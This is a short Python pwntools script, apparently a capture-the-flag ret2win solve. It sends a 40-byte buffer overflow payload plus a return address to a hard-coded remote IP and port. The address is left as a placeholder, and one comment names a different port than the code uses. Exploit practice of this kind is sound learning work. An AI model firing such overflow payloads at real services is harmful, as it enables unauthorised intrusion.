from pwn import *

# Dirección y puerto a donde te quieres conectar
ip = '35.188.115.217'  # Cambia esto por tu IP local o la IP donde está el servicio
port = 65534       # Cambia esto por el puerto corrrecto

# Crear la conexión remota al servicio en el puerto 4444
p = remote(ip, port)

# Creación del payload
payload = b'A' * 40  # 40 bytes para llenar el buffer
payload += p64(0x00000)  # Dirección de la función win() (esto debe ser la dirección correcta en tu binario)

# Enviar el payload cuando se recibe el mensaje de "Introduce tu mensaje:"
p.sendlineafter(b"Introduce tu mensaje:", payload)

# Recibir toda la salida después de enviar el payload
output = p.recvall()

# Imprimir la salida completa
print(output.decode())

# Cerrar la conexión
p.close()
